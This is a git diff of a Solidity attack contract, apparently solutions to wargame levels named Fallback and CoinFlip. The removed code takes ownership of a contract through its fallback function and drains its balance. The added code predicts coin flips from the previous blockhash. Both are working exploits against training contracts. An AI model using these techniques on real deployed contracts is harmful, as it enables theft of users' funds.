@@ -1,39 +1,42 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "./Fallback.sol";
+import "./CoinFlip.sol";
 
 // hardhat consol log from a solidity contract
 
 contract Attack {
-    Fallback public fallbackContract;
-    address payable owner;
+    CoinFlip public coinFlipContract;
 
-    constructor(address payable _fallbackAddress) {
-        fallbackContract = Fallback(_fallbackAddress);
-        owner = payable(msg.sender);
+    uint256 FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    event Deploy(address indexed _deployer, address indexed contractToAttack);
+    event Guess(bool _guess);
+    event Side(bool _side);
+
+    constructor(address payable _coinFlipContract) {
+        coinFlipContract = CoinFlip(_coinFlipContract);
+
+        emit Deploy(msg.sender, _coinFlipContract);
     }
 
     function attack() public payable {
-        // Contribue to fallback contract
-        uint256 amount1 = msg.value / 2;
-        uint256 amount2 = msg.value / 2;
-
-        fallbackContract.contribute{value: amount1}();
-
-        // send value to invoke fallback function (this allows me to becomme the owner)
-        (bool sent, ) = address(fallbackContract).call{value: amount2}("");
-        require(sent, "Failed to send eth");
-
-        // call the withdraw function.
-        fallbackContract.withdraw();
-
-        selfdestruct(owner);
+        // Foundry bonus = do this in one transaction
+        bool guess = predictFlips();
+        bool returnedAnswer = coinFlipContract.flip(guess);
+        emit Guess(returnedAnswer);
     }
 
-    function withdraw() public {
-        // withdraw the stolen money
-        owner.transfer(address(this).balance);
+    function predictFlips() public returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        // Event
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        emit Side(side);
+
+        return side;
     }
 
     receive() external payable {}
